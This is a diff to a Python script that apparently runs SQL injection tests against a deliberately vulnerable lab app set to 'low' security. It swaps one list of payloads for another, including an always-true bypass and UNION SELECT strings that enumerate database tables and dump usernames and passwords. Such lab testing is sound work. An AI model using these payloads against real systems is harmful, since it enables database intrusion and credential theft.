@@ -48,6 +48,7 @@ def login_and_setup_security():
     user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
     time.sleep(delay) 
     
+    print("Login response status:", response.status_code)
     #response = session.get(security_url)
     data = {
         'security': 'low',
@@ -56,7 +57,8 @@ def login_and_setup_security():
     }
     session.post(security_url, data=data, headers=headers)
     time.sleep(delay) 
-
+    
+    print("Security low mode response status:", response.status_code)
 def sql_injection_attack():
     total_tests = 0
     tests_passed = 0
@@ -65,13 +67,10 @@ def sql_injection_attack():
 
     # Example of SQLi payloads that might extract passwords if vulnerable
     payloads = {
-        '1': "' OR 1=1 /* comment */ -- ",
-        '2': "' UNI' || 'ON SELECT password FROM users WHERE user_id = '1' -- ",
-        '3': "' OR 1=1/**/AND/**/'1'='1'-- -",
-        '4': "'%27%20OR%20%271%27%3D%271",
-        '5': "' oR 1=1 -- ",
-        '6': "' OR 1 > 0 AND userid = '1' -- ",
-        '7': "' OR 1=1 AND '1'='0x31' -- "
+        '1': "' OR '1'='1'# ",
+        '2': "'UNION SELECT table_name, NULL FROM information_schema.tables --",
+        '3': "'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' --",
+        '4': "'UNION SELECT user, password FROM users --"
     }
 
     for user_id, payload in payloads.items():
